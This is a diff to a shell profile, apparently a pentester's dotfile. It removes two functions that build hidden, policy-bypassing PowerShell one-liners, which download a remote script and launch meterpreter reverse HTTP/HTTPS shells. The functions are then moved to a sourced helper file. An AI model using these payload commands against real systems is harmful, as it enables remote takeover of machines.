@@ -19,24 +19,7 @@ export GREP_OPTIONS='--color=always'
 export CLICOLOR=1
 export LSCOLORS=GxFxCxDxBxegedabagaced
 
-
-# Custom functions
-POWERSHELL="powershell -nop -ep bypass -noni -w hidden -c \"[Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; \$wc = new-object net.webclient; \$wc.Headers.Add(\\\"User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\\\");"
-
-# Powershell functions
-function powershell-rev-https-msf {
-	if [ -z $1 ]; then host=`en1`; else host=$1; fi;
-	if [ -z $2 ]; then port=443; else port=$2; fi; 
-	cmd="$POWERSHELL iex \$wc.downloadstring('http://$host/is.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $host -Lport 443 -Force -Proxy\"";
-	echo $cmd; echo -n $cmd | pbcopy;
-}
-
-function powershell-rev-http-msf {
-        if [ -z $1 ]; then host=`en1`; else host=$1; fi;
-        if [ -z $2 ]; then port=80; else port=$2; fi;
-        cmd="$POWERSHELL iex \$wc.downloadstring('http://$host/is.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost $host -Lport 80 -Force -Proxy\"";
-	echo $cmd; echo -n $cmd | pbcopy;
-}
+source $HOME/.powershell_helpers
 
 # Helper functions
 function end-of-line() { echo "CTRL+E mfer !"; }
